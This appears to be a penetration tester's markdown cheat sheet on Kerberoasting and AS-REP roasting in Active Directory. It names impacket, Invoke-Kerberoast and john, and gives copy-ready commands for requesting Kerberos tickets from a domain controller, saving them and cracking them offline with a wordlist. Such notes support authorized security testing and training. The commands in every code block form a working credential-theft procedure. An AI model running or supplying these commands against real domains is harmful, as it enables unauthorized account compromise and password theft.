# [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)

## Questions to ask yourself
  *  Can a list of usernames be obtained somehow?
  *  What services have service principal names?
      *  What users have permissions to access those services?

## Things to remember
  *  Domain account required with the exception of AS-REP roasting
  *  Cracking tickets is best done on real hardware
  *  Watch for mangled text formatting of ticket data blobs

## Useful tools
  *  [`impacket-GetNPUsers`](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) for AS-REP roasting
  *  [`impacket-GetUserSPNs`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) for standard kerberoasting
  *  [`Invoke-Kerberoast.ps1`](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1) for kerberoasting from a domain machine
  *  [`john`](https://www.openwall.com/john/) for cracking Kerberos ticket data blobs

## AS-REP roast
  *  Disabled pre-auth for a user account means anyone can request a TGT
  *  `impacket-GetNPUsers` for requesting TGT for pre-auth disabled users
      *  List of usernames required to AS-REP roast without creds

```
impacket-GetNPUsers example.com/ -no-pass -usersfile /path/to/known/usernames.txt -dc-ip 10.0.0.1
impacket-GetNPUsers example.com/ -no-pass -usersfile /path/to/known/usernames.txt -request -outputfile tgt.txt -dc-ip 10.0.0.1
impacket-GetNPUsers example.com/bob:password -request -dc-ip 10.0.0.1
```

## Kerberoast
  *  Any domain account (including machines) can request a TGS for any SPN
  *  `impacket-GetUserSPNs` for requesting TGS
      *  Gather SPNs of interest and target those first

```
impacket-GetUserSPNs example.com/MACHINEACCOUNT$ -hashes :[NT HASH] -dc-ip 10.0.0.1
impacket-GetUserSPNs example.com/bob:password -usersfile /path/to/known/usernames.txt -dc-ip 10.0.0.1
impacket-GetUserSPNs example.com/bob:password -request -outputfile tgs.txt -dc-ip 10.0.0.1
```

## Powershell kerberoast
  *  `Invoke-Kerberoast.ps1` for requesting TGS from a domain-joined Windows machine
      *  No extra pivoting needed when the KDC is reachable from the client

```
PS > Invoke-Kerberoast -Domain example.com
PS > Invoke-Kerberoast -Domain example.com -OutputFormat Hashcat | Select -ExpandProperty Hash
```

## Cracking Kerberos tickets
  *  `john` for cracking Kerberos tickets obtained via roasting
      *  Tab auto-complete in shell to list matching formats!

```
john -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep tgt.txt
john -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs tgs.txt
```
